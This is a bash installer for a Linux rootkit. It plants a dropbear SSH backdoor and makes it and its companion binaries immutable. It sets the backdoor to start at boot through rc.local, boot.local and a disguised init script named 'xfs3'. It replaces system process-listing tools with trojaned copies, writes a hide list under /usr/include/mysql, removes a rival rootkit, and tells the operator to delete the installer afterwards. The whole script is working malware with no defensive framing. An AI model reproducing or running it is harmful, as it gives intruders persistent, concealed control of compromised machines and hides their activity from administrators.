#!/bin/bash
IFS='
'
umask 0022
if [ ! -f vars.sh ]
then
    echo "Can't find vars.sh, exiting"
    exit
fi
source vars.sh
mkdir -p $rk_home_dir
cp dropbear $rk_home_dir
chmod +x $rk_home_dir/dropbear
chattr +ia $rk_home_dir/dropbear
cp busybox $rk_home_dir
chmod +x $rk_home_dir/busybox
chattr +ia $rk_home_dir/busybox
cp mig $rk_home_dir
chattr +ia $rk_home_dir/mig


if [ -x /etc/init.d/boot.local ]
then
    echo "autostart in /etc/init.d/boot.local"
    echo "$rk_home_dir/dropbear " >> /etc/init.d/boot.local
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/init.d/boot.local
fi


if [ -x /etc/rc.d/rc.local ]
then
    echo "autostart in /etc/rc.d/rc.local"
    echo  "$rk_home_dir/dropbear">> /etc/rc.d/rc.local
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/rc.d/rc.local
fi

dtest=`which update-rc.d`
if [ ! -z $dtest ]
then
    echo "debian like system"
    echo "$rk_home_dir/dropbear " >> /etc/init.d/xfs3
    echo "/usr/sbin/iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP" >> /etc/init.d/xfs3
    chmod +x /etc/init.d/xfs3
    update-rc.d xfs3 defaults
fi

$rk_home_dir/dropbear

#################################### procps
for l in `ls procps`
do
    o=`which $l`
    if [ ! -z $o ]
    then
	chattr -ia $o
	rm -f $o
	cp procps/$l $o
	chattr +ia $o
    fi
done
mkdir -p /usr/include/mysql
echo dropbear >> /usr/include/mysql/mysql.hh1
if [ -f /sbin/ttymon ]
then
    echo "WARNING: SHV5/SHV4 RK DETECTED"
    chattr -ia /sbin/ttymon /sbin/ttyload
    rm -f /sbin/ttymon /sbin/ttyload
    kill -9 `pidof ttymon`
    kill -9 `pidof ttyload`
fi
iptables -I OUTPUT 1 -p tcp --dport 45295 -j DROP
echo 
echo 
echo 
echo "Don't forget to:"
echo "cd .."
echo "rm -rf rk rk.tbz2"
